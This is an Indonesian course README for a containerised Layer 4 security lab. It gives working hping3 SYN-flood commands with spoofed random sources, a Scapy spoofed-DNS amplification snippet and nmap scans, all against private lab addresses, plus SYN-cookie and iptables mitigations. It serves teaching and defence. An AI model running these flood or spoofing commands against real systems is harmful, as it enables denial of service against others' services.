# 🔄 Pertemuan 6: L4 Security Lab (TCP/UDP Attacks)

Lab environment untuk praktik SYN flood, TCP session hijacking, dan UDP amplification attacks di Layer 4.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- 4GB RAM available
- ~2GB disk space

### Jalankan Lab
```bash
# Dari folder Pertemuan6/
docker-compose up -d

# Verifikasi (should show 4 containers)
docker-compose ps

# Akses attacker container
docker-compose exec attacker-l4 bash
```

### Cleanup
```bash
docker-compose down
```

---

## 📋 Lab Structure

```
Pertemuan6/
├── docker-compose.yml      # Lab configuration
├── README.md              # This file
├── captures/              # Untuk PCAP files
├── scripts/               # Untuk custom scripts
└── configs/               # Untuk nginx/service config
```

---

## 🐳 Container Services

| Container | IP | Role |
|-----------|----|----|
| attacker-l4 | 192.168.60.2 | Kali attacker (hping3, scapy) |
| target-webserver | 192.168.60.3:80 | Nginx web server |
| target-udp | 192.168.60.4:5353/UDP | DNS service (amplification) |
| monitor-l4 | 192.168.60.5 | Monitoring (tcpdump) |

---

## 📖 Lab Workflow

### SYN Flood Attack

**Terminal 1: Monitor Packets**
```bash
docker-compose exec monitor-l4 bash
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -c 100
```

**Terminal 2: Monitor Server State**
```bash
docker-compose exec target-webserver bash
watch -n 1 "netstat -atn | grep SYN_RECV | wc -l"
```

**Terminal 3: Launch Attack**
```bash
docker-compose exec attacker-l4 bash

# SYN Flood dengan hping3
hping3 -S --flood --rand-source -p 80 192.168.60.3

# Stop dengan Ctrl+C setelah 10-15 detik
```

### Observe Impact
- Terminal 1: Lihat ribuan SYN packets tanpa ACK
- Terminal 2: SYN_RECV connections meningkat drastis
- Web server menjadi tidak responsive

---

## 🔧 Common Attacks

### TCP SYN Flood
```bash
# Basic
hping3 -S -p 80 192.168.60.3

# Dengan flood rate
hping3 -S --flood -p 80 192.168.60.3

# Dengan IP spoofing
hping3 -S --flood --rand-source -p 80 192.168.60.3
```

### UDP Amplification
```bash
# DNS amplification
nslookup @192.168.60.4 -port=5353 google.com

# Scapy based
python3 << 'EOF'
from scapy.all import *
pkt = IP(src="192.168.60.3", dst="192.168.60.4")/UDP(dport=5353)/DNS(rd=1)
send(pkt)
EOF
```

### Port Scanning
```bash
# Scan web server
nmap -p 1-10000 192.168.60.3

# UDP port scan
nmap -sU 192.168.60.4
```

---

## 🔧 Mitigation Testing

### Enable SYN Cookies
```bash
docker-compose exec target-webserver bash

# Enable
sysctl -w net.ipv4.tcp_syncookies=1

# Verify
sysctl net.ipv4.tcp_syncookies  # should return 1
```

### Rate Limiting
```bash
docker-compose exec target-webserver bash

# Limit new connections
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Test attack lagi
# Akan terlihat pembatasan koneksi
```

---

## 📊 Packet Analysis

### Capture SYN Flood
```bash
# Di monitor
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -w synflood.pcap
docker cp monitor-l4:/tmp/synflood.pcap captures/

# Analyze di Wireshark
wireshark captures/synflood.pcap
```

### Check Connection States
```bash
docker-compose exec target-webserver bash

# View current states
netstat -atn | grep -E 'LISTEN|ESTABLISHED|SYN_RECV'

# Count by state
netstat -atn | grep -o '[A-Z_]*' | sort | uniq -c
```

---

## 🔧 Troubleshooting

**Containers tidak start:**
```bash
docker-compose logs
docker-compose logs target-webserver
```

**hping3 not found:**
```bash
docker-compose exec attacker-l4 bash
apt update && apt install -y hping3
```

**Can't connect to web server:**
```bash
docker-compose exec attacker-l4 bash
curl http://192.168.60.3

# If error, check if nginx running
docker-compose logs target-webserver
```

**Too many processes/connections:**
```bash
# Kill stray processes
docker-compose restart attacker-l4

# Clear connection table
docker-compose restart target-webserver
```

---

## 📝 Lab Assignment

Ikuti hands-on di `Pertemuan6.md` section 5+:

1. Setup lab dan verify containers
2. Monitor network dengan tcpdump
3. Launch SYN flood attack
4. Observe server resource exhaustion
5. Test mitigation (SYN cookies, rate limit)
6. Analyze PCAP files
7. Advanced: UDP amplification

---

## 💾 Saving Results

```bash
# Backup captures
cp captures/* ~/backups/

# Backup scripts
cp scripts/* ~/backups/

# Export test results
docker-compose exec monitor-l4 tcpdump -r capture.pcap > analysis.txt
cp analysis.txt ~/backups/
```

---

## 🎓 Learning Outcomes

Setelah lab ini, Anda akan memahami:
- ✅ TCP three-way handshake
- ✅ SYN flood mechanism dan impact
- ✅ Server resource exhaustion
- ✅ TCP state machine
- ✅ UDP amplification attacks
- ✅ Mitigation strategies (SYN cookies, rate limiting)
- ✅ Real-time monitoring techniques

---

**Tips:**
- Monitor 3 terminal untuk attacker, target, dan packet capture
- Ubah attack parameters (--flood, --rand-source, duration)
- Test mitigation sebelum dan sesudah attack
- Dokumentasikan semua observations

**Performance:**
- Server responses before attack: <10ms
- During SYN flood: timeout/no response
- After SYN cookies: recovery to <50ms

**Next:** Baca `Pertemuan6.md` untuk teori lengkap dan advanced scenarios.
